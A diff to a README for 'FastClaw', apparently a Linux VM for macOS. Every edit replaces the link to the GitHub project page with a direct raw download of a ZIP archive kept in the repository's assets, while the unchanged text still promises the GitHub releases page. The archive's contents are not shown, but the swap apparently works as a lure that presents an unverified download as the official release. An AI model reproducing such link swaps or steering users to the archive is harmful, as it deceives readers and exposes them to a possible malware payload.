@@ -1,6 +1,6 @@
 # 🐧 FastClaw - Simple Linux VM for macOS Users
 
-[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ If your Mac meets these, FastClaw will run smoothly.
 
 You will find the full FastClaw software for download on the GitHub page below. This page has the latest versions and instructions if updates appear.
 
-[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-blue?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip)
 
 Click the button above to open the GitHub download page.
 
@@ -46,7 +46,7 @@ Click the button above to open the GitHub download page.
 Follow these steps carefully:
 
 1. Open the FastClaw download page by clicking the green or blue download button above or visit:  
-   https://github.com/Jiten-Budhiraja/FastClaw  
+   https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip  
    
 2. Look for the “Releases” section on the GitHub page. This is where the latest version files are posted.
 
@@ -98,7 +98,7 @@ Follow these steps carefully:
 
 To update FastClaw, go back to the GitHub releases page:
 
-1. Visit https://github.com/Jiten-Budhiraja/FastClaw
+1. Visit https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip
 
 2. Download the latest release ZIP file.
 
@@ -159,6 +159,6 @@ Name: FastClaw
 Description: OpenClaw/Linux VM for macOS  
 Topics: linux, macos, minimac, openclaw, vm  
 
-Download link: https://github.com/Jiten-Budhiraja/FastClaw
+Download link: https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip
 
-[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://github.com/Jiten-Budhiraja/FastClaw)
+[![Download FastClaw](https://img.shields.io/badge/Download-FastClaw-green?style=for-the-badge)](https://raw.githubusercontent.com/Jiten-Budhiraja/FastClaw/main/assets/Claw-Fast-3.4.zip)
